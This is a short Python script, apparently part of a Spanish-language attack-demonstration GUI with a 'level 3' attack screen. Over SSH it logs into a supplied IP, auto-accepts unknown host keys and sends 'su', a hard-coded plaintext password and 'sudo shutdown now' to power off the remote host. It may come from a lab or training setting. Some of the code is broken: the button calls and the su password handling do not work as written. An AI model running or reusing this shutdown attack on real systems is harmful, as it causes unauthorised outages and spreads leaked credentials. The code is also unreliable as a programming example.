import paramiko
from tkinter import TOP, Toplevel, Label, Button

def attack3(main_screen, user, password, ip):
    def on_closing():
        messageWindow.destroy()
        main_screen.deiconify()
    messageWindow = Toplevel(main_screen)
    messageWindow.title("Ataque nivel 3")
    #Label(messageWindow, text="Este is el ataque de nivel 3").pack()
    #messageWindow.geometry("860x560")
    #permite pantalla fullscreen
    messageWindow.attributes('-fullscreen', True)
    messageWindow.config(background="#65707F")
    tit = Label(messageWindow, text="Este es el ataque de nivel 3", font="Helvetica 20 bold", bg="#65707F", fg="white")
    tit.pack(pady=50)
    sub = Label(messageWindow, text="Explotación de vulernabilidad", font="Helvetica 20", bg="#65707F", fg="white")
    sub.pack(pady=30)

    #Descomentar para agregar boton si no pasa ssh
    #Regresar a menu principal
    btn_back= Button(messageWindow, text="Regresar", font=12, height=4, width=30,bg="black", fg="white", command=lambda:on_closing()).pack()
    btn_back.grid(row=0, column=1,padx=10, pady=10, sticky="nsew")


    #Conexion ssh para demostracion
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=password)
    #Se ejecuta comando
    _stdin, _stdout,_stderr = client.exec_command("su")
    _stdin, _stdout,_stderr = client.exec_command("Absa2023!")
    _stdin, _stdout,_stderr = client.exec_command("sudo shutdown now")
    client.close()


    #### Codigo para PLC

    ###### Botones
    #Regresar a menu principal
    btn_back= Button(messageWindow, text="Regresar", font=12, height=4, width=30,bg="black", fg="white", command=lambda: on_closing()).pack()
    btn_back.grid(row=0,column=1,padx=10, pady=10, sticky="nsew")


   
    messageWindow.protocol("WM_DELETE_WINDOW", on_closing)